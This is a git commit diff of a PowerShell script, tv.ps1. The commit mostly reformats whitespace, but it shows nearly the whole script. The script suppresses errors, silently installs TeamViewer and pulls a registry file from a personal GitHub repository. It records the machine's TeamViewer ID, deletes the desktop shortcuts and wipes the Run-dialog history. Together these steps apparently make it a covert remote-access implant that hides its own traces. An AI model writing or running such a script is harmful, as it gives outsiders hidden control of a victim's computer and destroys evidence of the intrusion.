610770c69c2a60f6725a3a5cf4ccbdf338e7612e
d77juan <79436534+d77juan@users.noreply.github.com>
2021-06-15 03:42:08 -0700

    Update tv.ps1

--- tv.ps1
+++ tv.ps1
@@ -1,11 +1,11 @@
 #[tv.ps1]
 $ErrorActionPreference='silentlycontinue'
-$p = "$env:temp"
-$i = "$p\TeamViewer_Setup.exe"
-$r = "$p\tv.reg"
+$p="$env:temp"
+$i="$p\TeamViewer_Setup.exe"
+$r="$p\tv.reg"
 iwr -useb "https://dl.teamviewer.com/download/version_15x/TeamViewer_Setup.exe" -o $i
 iwr -useb "https://raw.githubusercontent.com/d77juan/t3st1n6/main/tv.reg" -o $r
-$l = "$p\$env:COMPUTERNAME-TV-ID.txt"
+$l="$p\$env:COMPUTERNAME-TV-ID.txt"
 start -wait $i /S
 sleep 2
 net stop teamviewer
@@ -17,4 +17,4 @@ sleep 2
 (Get-ItemProperty -Path 'HKLM:\SOFTWARE\WOW6432Node\TeamViewer' -Name ClientID).ClientID > $l
 Remove-Item "$home\Desktop\TeamViewer.lnk"
 Remove-Item "$env:public\desktop\TeamViewer.lnk"
-Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name * -ErrorAction SilentlyContinue
+Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name *
